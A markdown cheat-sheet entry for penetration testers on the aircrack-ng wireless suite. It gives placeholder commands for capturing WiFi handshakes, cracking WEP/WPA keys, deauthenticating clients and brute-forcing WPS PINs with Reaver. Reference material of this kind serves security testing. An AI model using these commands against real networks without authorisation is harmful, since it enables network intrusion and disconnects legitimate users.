---
type: tool
category: wireless
tags: [wireless, wifi, wep, wpa, aircrack, monitor-mode]
source: teamghsoftware/security-cheatsheets
---

## What it is
aircrack-ng is a suite of tools for wireless network security — monitoring, capturing handshakes, and cracking WEP/WPA/WPA2 keys.

## Workflow

### 1 — Enable monitor mode

```bash
airmon-ng start wlan0
# Creates wlan0mon (or mon0)
```

### 2 — Discover networks

```bash
airodump-ng wlan0mon
```

### 3 — Capture target traffic

```bash
airodump-ng -c <channel> --bssid <AP-MAC> -w <capture-name> wlan0mon
```

### 4 — Crack

```bash
# WEP
aircrack-ng -a 1 -e <essid> -l <output-file> <capture.cap>

# WPA/WPA2 — wordlist
aircrack-ng -e <essid> -w <wordlist> <capture.cap>

# WPA/WPA2 — airolib-ng pre-computed table
aircrack-ng -e <essid> -r <database> <capture.cap>

# By BSSID
aircrack-ng -b <bssid> -l <output-file> <capture.cap>
```

## Deauth attack (force re-handshake capture)

```bash
aireplay-ng -0 20 -a <BSSID> -c <client-MAC> wlan0mon
# -0 20 = send 20 deauth packets
```

## WPS attack (Reaver)

```bash
wash -i wlan0mon -C                      # scan for WPS-enabled APs
reaver -i wlan0mon -b <BSSID> -vv -S     # brute force WPS PIN
```

## Find hidden SSID

```bash
airmon-ng start wlan0
airodump-ng -c <channel> --bssid <BSSID> wlan0mon
# Send deauth to force clients to reconnect and reveal SSID
aireplay-ng -0 20 -a <BSSID> -c <victim-MAC> wlan0mon
```

## Related
- [[wireshark]]
- [[Pentest Recon Cheatsheet]]
